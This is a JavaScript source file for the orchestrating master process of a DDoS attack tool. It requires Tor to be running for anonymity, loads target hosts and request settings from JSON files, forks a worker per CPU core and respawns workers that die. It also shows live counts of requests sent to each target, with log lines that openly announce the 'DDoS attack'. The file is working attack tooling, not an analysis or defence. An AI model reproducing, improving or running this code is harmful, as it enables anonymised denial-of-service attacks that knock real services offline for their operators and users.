import cluster from 'cluster';
import { cpus } from 'os';
import process from 'process';
import { readFile } from 'fs/promises';
import { resolve } from 'path';
import { DATA_MSG, EXIT_MSG } from './constants.mjs';
import { checkIfTorIsStartedOrExit } from "./utils.mjs";

let configPath, targetsPath;

const startLogMessage = ['DDoS attack launched on', '        ' + new Date().toLocaleString()];
const configMessages = [];

const startTimestamp = Date.now();
const perRequestStats = {};

let statTimer;

function isDefined(value) {
	return value !== null && value !== undefined;
}

async function getConfig() {
	return JSON.parse(await readFile(new URL(configPath, import.meta.url)));
}

async function getTargets() {
	return JSON.parse(await readFile(new URL(targetsPath, import.meta.url)));
}

function verifyUserConfig(userConfig) {
	if (!isDefined(userConfig.requestPerBatch)) {
		configMessages.push('-- "requestPerBatch" not specified in the config.json. Fallback to 10.');
	}
	if (!isDefined(userConfig.logEveryMs)) {
		configMessages.push('-- "logEveryMs" not specified in the config.json. Fallback to 1000ms.');
	}
	if (!isDefined(userConfig.delayBetweenBatch)) {
		configMessages.push('-- "delayBetweenBatch" not specified in the config.json. Fallback to 0ms.');
	}
}

function logStats(cpuCount) {
	process.stdout.write('\x1Bc')
	const elapsedTime = ((Date.now() - startTimestamp) / 1000).toFixed(3);
	const preparedTableStats = Object.keys(perRequestStats).map(key => {
		return perRequestStats[key].details;
	});
	console.table(preparedTableStats);
	console.info(...startLogMessage);
	console.info('Available CPU(s)               ', cpuCount ?? 0);
	console.info('Worker(s) running              ', Object.keys(cluster.workers).length ?? 0);
	console.info('Total requests sent            ', Object.values(perRequestStats).reduce((count, data) => {
		count += Object.values(data)[0].requests;
		return count;
	}, 0));
	console.info('Time elapsed since launching   ', elapsedTime, 'second(s)');
	if (configMessages.length) {
		console.info('User config messages:\n', configMessages.join('\n'));
	}
}

function aggregateWorkersStats(workerData) {
	const { host, port, path } = workerData;
	const key = host + ':' + port + path;
	perRequestStats[key] = perRequestStats[key] || {
		details: { host, port, path, requests: 0, errors: 0, success: 0 }
	};
	perRequestStats[key].details.success += Number(workerData.success);
	perRequestStats[key].details.errors += Number(workerData.errors);
	perRequestStats[key].details.requests += Number(workerData.requests);
}

export async function startMaster() {
	await checkIfTorIsStartedOrExit();

	const argv = process.argv.splice(2, 3);

	if (!argv.length) {
		throw new Error('Missing arguments path to targets.json and config.json');
	}

	configPath = resolve(process.cwd(), argv.pop());
	targetsPath = resolve(process.cwd(), argv.pop());

	console.info('using targets from path', targetsPath);
	console.info('using config from path', configPath);

	const numCPUs = cpus().length;

	const { data } = await getTargets();
	const userConfig = await getConfig();
	verifyUserConfig(userConfig);

	const preparedUserConfig = {
		requestPerBatch: 10,
		logEveryMs: 1000,
		delayBetweenBatch: 0,
		...(userConfig)
	};

	for (let i = 0; i < numCPUs; ++i) {
		cluster.fork({
			USER_CONFIG: JSON.stringify(preparedUserConfig),
			TARGETS: JSON.stringify(data),
			CONFIG_MESSAGE: JSON.stringify(configMessages)
		});
	}

	cluster.on('message', (worker, msg) => {
		if (msg.cmd === DATA_MSG) {
			aggregateWorkersStats(msg.data);
		}
	});

	cluster.on('exit', () => {
		cluster.fork({
			USER_CONFIG: JSON.stringify(preparedUserConfig),
			TARGETS: JSON.stringify(data),
			CONFIG_MESSAGE: JSON.stringify(configMessages)
		});
	});

	process.on(EXIT_MSG, () => {
		clearInterval(statTimer);
		console.info('DDoS attack stopped on', '        ' + new Date().toLocaleString());
	});

	statTimer = setInterval(() => logStats(numCPUs), userConfig.logEveryMs);
}
